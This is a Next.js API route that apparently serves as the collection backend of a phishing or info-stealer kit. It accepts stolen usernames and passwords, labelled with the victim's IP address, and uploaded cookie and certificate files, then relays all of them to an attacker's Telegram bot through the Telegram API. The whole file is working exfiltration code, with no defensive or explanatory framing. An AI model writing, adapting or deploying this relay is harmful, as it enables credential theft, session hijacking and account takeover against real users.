// pages/api/relay.js
import multer from "multer";
import nextConnect from "next-connect";

// Multer for multipart/form-data
const upload = multer();

const handler = nextConnect({
  onError(err, req, res) {
    console.error("🚨 Handler Error:", err);
    res.status(500).json({ success: false, message: "Internal Server Error", error: err.message });
  },
  onNoMatch(req, res) {
    console.warn("⚠️ No matching route for", req.method, req.url);
    res.status(405).json({ success: false, message: `Method ${req.method} Not Allowed` });
  },
});

// Disable Next.js bodyParser so multer can run
export const config = {
  api: { bodyParser: false },
};

handler.use(upload.single("file"));

// Log every incoming request for debugging
handler.use((req, res, next) => {
  console.log("📥 Incoming /api/relay request");
  console.log("Headers:", JSON.stringify(req.headers, null, 2));
  // if it's JSON, we need to parse raw body
  if (req.headers["content-type"]?.includes("application/json")) {
    let buf = "";
    req.on("data", chunk => buf += chunk);
    req.on("end", () => {
      try {
        req.body = JSON.parse(buf);
      } catch (e) {
        console.error("❌ JSON parse error:", e);
      }
      console.log("Body:", req.body);
      next();
    });
  } else {
    console.log("Body (form-data/file):", req.body, req.file ? "has file" : "no file");
    next();
  }
});

handler.post(async (req, res) => {
  const { ip, type } = req.body;
  console.log(`🚀 Handling payload type=${type} from IP=${ip}`);

  const token  = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.error("💥 Missing Telegram env vars!");
    return res.status(500).json({ success: false, message: "Bot not configured" });
  }
  const apiUrl = `https://api.telegram.org/bot${token}`;

  try {
    let tgRes;
    if (type === "creds") {
      const { user, pass } = req.body;
      const text = `🔑 Credentials from ${ip}:\nUser: ${user}\nPass: ${pass}`;
      tgRes = await fetch(`${apiUrl}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    } else if ((type === "cookie-file" || type === "cert-file") && req.file) {
      console.log("📂 Received file:", req.file.originalname, "size=", req.file.size);
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("document", req.file.buffer, req.file.originalname);
      tgRes = await fetch(`${apiUrl}/sendDocument`, {
        method: "POST",
        body: form
      });
    } else {
      console.warn("⚠️ Unrecognized payload shape:", req.body);
      return res.status(400).json({ success: false, message: "Bad payload" });
    }

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      console.error("❌ Telegram API error:", tgRes.status, errText);
      return res.status(502).json({ success: false, message: "Telegram API error", details: errText });
    }

    console.log("✅ Telegram API responded OK");
    res.status(200).json({ success: true });
  } catch (err) {
    console.error("❌ Unexpected handler error:", err);
    res.status(500).json({ success: false, message: "Internal Error", error: err.message });
  }
});

export default handler;
